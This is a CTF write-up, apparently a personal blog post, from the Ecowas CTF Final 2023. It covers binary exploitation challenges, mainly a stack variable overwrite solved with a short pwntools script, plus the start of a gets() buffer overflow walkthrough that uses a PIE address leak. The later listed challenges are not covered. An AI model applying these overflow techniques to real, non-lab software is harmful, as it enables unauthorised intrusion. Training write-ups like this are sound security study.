<h1> Ecowas CTF Final 2023 </h1>

Hi, I participated in this ctf final as `@Urahara` playing with team `error` from `Nigeria`

I'll give the solution to some of the challenges that I solved and maybe the ones that doesn't require an instance to connect to since most of them are currently down :(

### Binary Exploitation
- Offset
- Aslr Overflow
- Cookie
- Dep
- Just Login
- Yooeyyeff
- Gigashell
- Leakme
- Chain game

### Boot2Root
- Relay

### Binary Exploitation

#### Offset:

I won't attach the challenge description cause I can't access the CTFd challenge dashboard again too bad :(

Anyways let's get to it

We are given a binary file checking the file type and the protection enabled on it shows this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d8eccc2-bbc2-4fc8-9121-b1726fd77fa0)

So we're working with a x64 binary which is dynamically linked and not stripped and from the result of gotten from running checksec we can see that all protections are enabled 💀

I ran it to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83318517-7330-4eac-b9a9-8f5a9a00e382)

We can see that on running it we're asked for the offset and when i don't get it then some random values are outputted to my screen

In order to solve this need to know what's going on so I decompiled it using Ghidra

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/71ec891e-1e80-44ac-b63a-ffc7ccd801af)

```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long check;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  check = 0xcafebabe;
  puts("Do y0u know the right offset?");
  read(0,&input,0x30);
  if (check == 0xdeadbeef) {
    run_command("/bin/cat flag.txt");
  }
  else {
    run_command("/bin/cat /dev/random");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Looking at the pseudo code we can see that it initalizes `0xcafebabe` to variable `check` then after it receives our input the value of `check` is being compared with `0xdeadbeef`

If the comparism returns `True` it calls the function `run_command` passing a command to `cat` the `flag` else it `cat /dev/random`

Checking the function `run_command` shows it just triggers `system` on the parameter passed into the function 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/acae91aa-b1e0-4592-a228-2e16122d1072)

So what now?

We know that we need to make `check` equal `0xdeadbeef` and this can be achieved by simply overwriting the value stored in that variable 

So this is just a basic variable overwrite challenge

The way I got this is by getting the offset from our input to the variable and I just looked at the stack frame on ghidra
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/501b0868-4e92-4d08-a1b8-9f3e34f8f530)

Cool it's `0x38 - 0x18 = 32`

So we just need 32 bytes then pass `0xdeadbeef` (packed in endianess) to overwrite the variable to that

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/offset/solve.py)

```python
from pwn import *

# io = process('./offset')
io = remote('0.cloud.chals.io', 19052) 
context.log_level = 'debug'

offset = 32
overwrite = p64(0xdeadbeef)
payload = b'A'*offset + overwrite
io.sendline(payload)

io.interactive()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ae72425-3122-4786-ac8a-e432c18eeeba)

```
Flag: flag{m4th_i5_imp0rtan7_8ut_n0t_r3ally}
```

#### ASLR Overflow [First Blood 🩸]

On checking the file type and protections enabled on the binary showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/81eb19c3-f7a3-42ae-a758-dca7cc17696f)

We are working with a x86 binary which is dynamically linked and not stripped, the only protection not enabled is `Stack Canary`

Running it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7251f490-1db9-492e-9590-4f23e25d6f73)

On running it we get a binary section leak and then it receives our input

I decompiled it usnig Ghidra and here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aed297f4-6c39-46fe-bdb4-2ee683146746)

Nothing interesting it just calls the `home` function

Checking the decompiled code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8538a92d-a20e-465e-b0bb-0e92ed34ccb0)

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void home(void)

{
  char buffer [32];
  code *leak;
  
  leak = home;
  printf("I moved. My new home address is: %p\nCool?\n",home);
  fflush(stdout);
  gets(buffer);
  return;
}
```

Ok cool

This portion of the binary gives us the address of the `home` function then uses `gets()` to receive our input

So we have a buffer overflow because it is impossible to tell without knowing the data in advance how many characters `gets()` will read, and because `gets()` will continue to store characters past the end of the buffer

What now? 

Looking at the other functions shows this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2730cd9b-c6dc-4997-b18d-78aaffd2bd2e)

The `get_shell` function looks interesting, checking the decompiled code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6fbe238a-556c-47cc-825a-46dde26f58bf)

Nice this function would spawn a shell, and since it wasn't called in the main function our goal is to overwrite the `EIP` to call the `get_shell` function

The problem here is that PIE is enabled and basically it will randomize the memory address on each program execution

But that's not a problem because we have a leak of the `home` function so we can calculate the `elf` base address

Let's get the offset needed to overwrite the EIP (Instruction Pointer)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c85d1ea2-e885-4186-85d0-76b31a4dabc1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83c6db3e-e329-4b01-b99f-13faeb5a123f)







This CTF was an interesting one and I meet tons of cool people there 
